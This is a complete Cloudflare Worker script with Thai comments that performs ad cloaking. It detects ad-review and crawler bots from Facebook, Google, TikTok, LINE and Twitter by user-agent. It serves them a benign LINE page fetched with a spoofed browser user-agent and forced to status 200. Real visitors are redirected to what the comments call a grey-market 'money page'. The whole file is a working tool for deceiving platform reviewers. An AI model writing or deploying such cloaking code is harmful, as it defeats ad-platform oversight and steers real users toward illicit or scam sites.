export default {
  async fetch(request, env, ctx) {
    const userAgent = request.headers.get('user-agent') || '';
    
    // รายชื่อบอทตรวจแอด
    const botPattern = /facebookexternalhit|Facebot|MetaInspector|facebookcatalog|Googlebot|AdsBot-Google|Mediapartners-Google|Google-Adwords|Google-PageRenderer|Line-poker|Linespider|TikTokSpider|ByteSpider|Twitterbot/i;

    const isBot = botPattern.test(userAgent);

    // ปลายทาง
    const safePage = 'https://skipme.link/Friend'; // หน้า LINE สำหรับบอท
    const moneyPage = 'https://skipme.link/toweb';   // หน้าเว็บเทสำหรับคนจริง

    if (isBot) {
      try {
        // ให้ Worker แอบไปดึงหน้า Friend มาเนียนๆ โดยปลอม User-Agent เป็นเบราว์เซอร์
        const response = await fetch(safePage, {
          headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
          }
        });

        // ส่งเนื้อหาคืนให้ Facebook บอททันที พร้อมบังคับ Status 200 (ห้ามใช้ Redirect 302)
        return new Response(response.body, {
          status: 200,
          headers: {
            'Content-Type': response.headers.get('content-type') || 'text/html; charset=utf-8'
          }
        });
      } catch (e) {
        // กรณีฉุกเฉินจริงๆค่อยสำรองด้วย 302
        return Response.redirect(safePage, 302);
      }
    } else {
      // สำหรับคนจริง: สลับรางไปหน้าเว็บเทาตามปกติ
      return Response.redirect(moneyPage, 302);
    }
  }
};
